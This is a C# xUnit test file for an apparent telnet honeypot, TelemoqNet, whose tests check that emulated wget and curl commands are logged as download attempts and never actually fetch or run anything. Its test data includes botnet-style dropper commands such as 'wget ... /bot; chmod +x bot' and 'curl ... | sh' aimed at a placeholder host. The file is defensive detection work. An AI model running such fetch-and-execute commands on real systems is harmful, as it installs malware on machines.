using System.Net;
using System.Net.Sockets;
using System.Text.Json;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.Extensions.Options;
using TelemoqNet.Api.Configuration;
using TelemoqNet.Api.Emulation;
using TelemoqNet.Api.Logging;
using Xunit;

namespace TelemoqNet.IntegrationTests;

public sealed class PayloadDownloadTests
{
    [Theory]
    [InlineData("curl --help", "Usage: curl [options...] <url>")]
    [InlineData("curl -h", "Usage: curl [options...] <url>")]
    [InlineData("curl --help all", "Usage: curl [options...] <url>")]
    [InlineData("curl --version", "curl 7.36.0")]
    [InlineData("curl -V", "curl 7.36.0")]
    [InlineData("curl --help http://example.invalid/bot", "Usage: curl [options...] <url>")]
    [InlineData("curl http://example.invalid/bot --help", "Usage: curl [options...] <url>")]
    [InlineData("curl --version http://example.invalid/bot", "curl 7.36.0")]
    [InlineData("wget --help", "Usage: wget [OPTIONS] URL...")]
    [InlineData("wget -h", "Usage: wget [OPTIONS] URL...")]
    [InlineData("wget --version", "BusyBox v1.19.4")]
    [InlineData("wget -V", "BusyBox v1.19.4")]
    [InlineData("busybox wget --help", "Usage: wget [OPTIONS] URL...")]
    [InlineData("/bin/busybox wget --version", "BusyBox v1.19.4")]
    [InlineData("wget --help http://example.invalid/bot", "Usage: wget [OPTIONS] URL...")]
    public async Task Telnet_InformationalOptions_ReturnOutputWithoutDownloadAttempt(string command, string expected)
    {
        await using var fixture = await TelnetFixture.StartAsync();
        await using var client = await fixture.ConnectAsync();
        await client.LoginAsync();
        await client.SendLineAsync(command, useCrNul: true);
        var response = await client.ReadUntilAsync("# ");

        Assert.Contains(expected, response);
        Assert.DoesNotContain("no URL specified", response);
        Assert.DoesNotContain("missing URL", response);
        Assert.DoesNotContain("Network is unreachable", response);

        await client.SendLineAsync("exit", useCrNul: true);
        var session = await fixture.WaitForSessionAsync();
        var captured = Assert.Single(session.Commands, entry => entry.Command == command);
        Assert.Contains(expected, captured.Response);
        Assert.DoesNotContain(session.Events, entry => entry.Type == "payload.download_attempt");
    }

    [Theory]
    [InlineData("wget", "wget: missing URL")]
    [InlineData("wget -q", "wget: missing URL")]
    [InlineData("wget -O /tmp/bot", "wget: missing URL")]
    [InlineData("wget --output-document http://example.invalid/output", "wget: missing URL")]
    [InlineData("wget ''", "wget: missing URL")]
    [InlineData("wget --", "wget: missing URL")]
    [InlineData("curl", "curl: no URL specified!")]
    [InlineData("curl -fsSL", "curl: no URL specified!")]
    [InlineData("curl -o /tmp/bot", "curl: no URL specified!")]
    [InlineData("curl --proxy http://proxy.invalid", "curl: no URL specified!")]
    [InlineData("curl --url ''", "curl: no URL specified!")]
    [InlineData("curl --url", "curl: no URL specified!")]
    [InlineData("busybox wget", "wget: missing URL")]
    [InlineData("/bin/busybox wget -O-", "wget: missing URL")]
    public async Task Telnet_DownloadWithoutUrl_ReturnsUsageAndCapturesNoAttempt(string command, string error)
    {
        await using var fixture = await TelnetFixture.StartAsync();
        await using var client = await fixture.ConnectAsync();
        await client.LoginAsync();
        await client.SendLineAsync(command, useCrNul: true);
        var response = await client.ReadUntilAsync("# ");

        Assert.Contains(error, response);
        Assert.DoesNotContain("Network is unreachable", response);

        await client.SendLineAsync("exit", useCrNul: true);
        var session = await fixture.WaitForSessionAsync();
        var captured = Assert.Single(session.Commands, entry => entry.Command == command);
        Assert.Contains(error, captured.Response);
        Assert.DoesNotContain(session.Events, entry => entry.Type == "payload.download_attempt");
    }

    [Theory]
    [InlineData("wget")]
    [InlineData("curl")]
    [InlineData("busybox wget")]
    public async Task SchemeLessDestination_IsStillTreatedAsUrlOperand(string tool)
    {
        var response = await Device().ExecuteCommandAsync(
            $"{tool} example.invalid/bot", CancellationToken.None);

        Assert.Contains("Network is unreachable", response);
    }

    [Theory]
    [InlineData("wget -q -O /tmp/bot http://example.invalid/bot.sh", "wget", "http://example.invalid/bot.sh")]
    [InlineData("/usr/bin/curl -fsSL 'https://example.invalid/a?x=1&y=2' -o /tmp/bot", "curl", "https://example.invalid/a?x=1&y=2")]
    [InlineData("/bin/busybox wget -O- ftp://example.invalid/bot", "wget", "ftp://example.invalid/bot")]
    [InlineData("cd /tmp; wget http://example.invalid/bot; chmod +x bot", "wget", "http://example.invalid/bot")]
    [InlineData("curl --url=https://example.invalid/bot | sh", "curl", "https://example.invalid/bot")]
    [InlineData("curl --url \"http://example.invalid/bot\"", "curl", "http://example.invalid/bot")]
    [InlineData("curl --proxy http://proxy.invalid --header 'Referer: http://ref.invalid' http://example.invalid/bot", "curl", "http://example.invalid/bot")]
    [InlineData("curl -o --help http://example.invalid/bot", "curl", "http://example.invalid/bot")]
    [InlineData("curl --header '--version' http://example.invalid/bot", "curl", "http://example.invalid/bot")]
    [InlineData("curl -- --help http://example.invalid/bot", "curl", "http://example.invalid/bot")]
    [InlineData("wget -O --help http://example.invalid/bot", "wget", "http://example.invalid/bot")]
    public async Task Attempts_AreCapturedWithoutEvaluatingCommands(string command, string tool, string url)
    {
        var attempts = new List<PayloadDownloadAttempt>();
        await Device().ExecuteCommandAsync(command, CancellationToken.None, attempts.Add);

        var attempt = Assert.Single(attempts);
        Assert.Equal(tool, attempt.Tool);
        Assert.Equal(url, attempt.Url);
        Assert.False(attempt.Executed);
        Assert.False(attempt.Downloaded);
    }

    [Theory]
    [InlineData("echo wget http://example.invalid/bot")]
    [InlineData("echo 'curl http://example.invalid/bot; wget http://example.invalid/other'")]
    [InlineData("cat http://example.invalid/bot")]
    [InlineData("wget")]
    [InlineData("wget --output-document http://example.invalid/output")]
    [InlineData("curl --proxy http://example.invalid/proxy")]
    [InlineData("curl > http://example.invalid/output")]
    [InlineData("wget file:///etc/passwd")]
    [InlineData("wget 'http://example.invalid/unterminated")]
    [InlineData("# wget http://example.invalid/comment")]
    public async Task NonAttempts_DoNotProduceDownloadEvents(string command)
    {
        var attempts = new List<PayloadDownloadAttempt>();
        await Device().ExecuteCommandAsync(command, CancellationToken.None, attempts.Add);
        Assert.Empty(attempts);
    }

    [Fact]
    public async Task MultipleUrls_ProduceOrderedAttempts()
    {
        var attempts = new List<PayloadDownloadAttempt>();
        await Device().ExecuteCommandAsync(
            "wget http://example.invalid/one http://example.invalid/two && curl https://example.invalid/three",
            CancellationToken.None, attempts.Add);
        Assert.Equal(new[] { "http://example.invalid/one", "http://example.invalid/two", "https://example.invalid/three" },
            attempts.Select(attempt => attempt.Url));
    }

    [Theory]
    [InlineData("wget")]
    [InlineData("curl")]
    [InlineData("busybox wget")]
    public async Task DownloadCommands_NeverConnectOrCreatePayload(string tool)
    {
        using var target = new TcpListener(IPAddress.Loopback, 0);
        target.Start();
        var port = ((IPEndPoint)target.LocalEndpoint).Port;
        var device = Device();
        var outputOption = tool == "curl" ? "-o" : "-O";

        var response = await device.ExecuteCommandAsync(
            $"{tool} {outputOption} /tmp/payload http://127.0.0.1:{port}/bot", CancellationToken.None);

        Assert.Contains("Network is unreachable", response);
        Assert.DoesNotContain("simulated", response);
        Assert.False(target.Pending());
        Assert.Contains("No such file", await device.ExecuteCommandAsync("cat /tmp/payload", CancellationToken.None));
    }

    [Theory]
    [InlineData("wget", "http://example.invalid/bot.sh")]
    [InlineData("curl", "https://example.invalid/bot.sh")]
    public async Task Telnet_PersistsStructuredAttemptWithOriginalCommand(string tool, string url)
    {
        await using var fixture = await TelnetFixture.StartAsync();
        await using var client = await fixture.ConnectAsync();
        await client.LoginAsync();
        var command = $"{tool} '{url}'";
        await client.SendLineAsync(command, useCrNul: true);
        var response = await client.ReadUntilAsync("Network is unreachable\r\n# ");
        Assert.DoesNotContain("simulated", response);
        await client.SendLineAsync("exit", useCrNul: true);
        var session = await fixture.WaitForSessionAsync();

        Assert.Contains(session.Commands, entry => entry.Command == command);
        var entry = Assert.Single(session.Events, entry => entry.Type == "payload.download_attempt");
        Assert.Equal(new PayloadDownloadAttempt(tool, url), entry.DownloadAttempt);
        var received = Assert.Single(session.Events, entry => entry.Type == "command.received" && entry.Detail == command);
        Assert.True(received.Sequence < entry.Sequence);
        Assert.InRange(entry.Timestamp, received.Timestamp, session.EndedAt!.Value);
        Assert.Equal(session.Events.Count, session.Events.Select(entry => entry.Sequence).Distinct().Count());

        using var json = JsonDocument.Parse(JsonSerializer.Serialize(session));
        Assert.Equal(2, json.RootElement.GetProperty("SchemaVersion").GetInt32());
        var stored = json.RootElement.GetProperty("Events").EnumerateArray()
            .Single(item => item.GetProperty("Type").GetString() == "payload.download_attempt")
            .GetProperty("DownloadAttempt");
        Assert.Equal(tool, stored.GetProperty("Tool").GetString());
        Assert.Equal(url, stored.GetProperty("Url").GetString());
        Assert.False(stored.GetProperty("Executed").GetBoolean());
        Assert.False(stored.GetProperty("Downloaded").GetBoolean());

        var path = Path.Combine(Path.GetTempPath(), $"telemoqnet-{Guid.NewGuid()}.csv");
        try
        {
            var configuration = new ConfigurationBuilder().AddInMemoryCollection(
                new Dictionary<string, string?> { ["LocalStorage:CsvPath"] = path }).Build();
            await new LocalCsvSessionStore(configuration, NullLogger<LocalCsvSessionStore>.Instance)
                .StoreAsync(session, CancellationToken.None);
            var csv = await File.ReadAllTextAsync(path);
            Assert.Contains(JsonSerializer.Serialize(session.Events).Replace("\"", "\"\""), csv);
        }
        finally
        {
            File.Delete(path);
        }
    }

    private static GenericLinuxDevice Device() => new(Options.Create(new HoneypotOptions
    {
        CommandLatencyMilliseconds = 0
    }));
}
